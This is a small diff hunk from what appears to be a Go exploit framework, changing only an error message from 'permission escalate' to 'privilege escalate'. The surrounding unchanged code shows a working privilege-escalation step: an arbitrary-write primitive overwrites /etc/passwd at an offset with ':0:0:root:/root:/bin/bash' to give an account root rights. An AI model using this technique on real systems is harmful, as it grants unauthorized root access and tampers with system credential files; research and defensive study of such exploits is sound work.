@@ -15,7 +15,7 @@ func Escalate(primitive Primitive) error {
 	payload := []byte(":0:0:root:/root:/bin/bash\n")
 	if err := primitive.Write("/etc/passwd", int64(offset), payload); err != nil {
 		return fmt.Errorf(
-			"%s permission escalate: write /etc/passwd at offset %d with %d bytes: %w",
+			"%s privilege escalate: write /etc/passwd at offset %d with %d bytes: %w",
 			primitive.GetExpName(), offset, len(payload), err,
 		)
 	}
